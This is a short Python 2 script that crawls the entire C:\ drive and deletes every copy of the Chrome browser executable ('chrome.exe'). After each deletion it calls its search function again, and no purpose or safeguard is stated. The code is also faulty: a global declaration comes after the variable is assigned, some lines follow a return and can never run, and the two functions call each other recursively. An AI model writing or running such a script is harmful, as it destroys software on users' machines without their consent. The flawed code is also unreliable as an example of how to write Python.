import os
from os.path import join
import shutil

location = "C:\\"
lookfor = "chrome.exe"
searchagain = False


def search():
    for root, dirs, files in os.walk(location):
        print "searching", root
        if lookfor in files:
            print "found: %s" % join(root, lookfor)
            delete = join(root, lookfor)
            global delete
            operation()
            return delete
            search()
            break

def operation():
    os.remove(delete)
    search()


search()


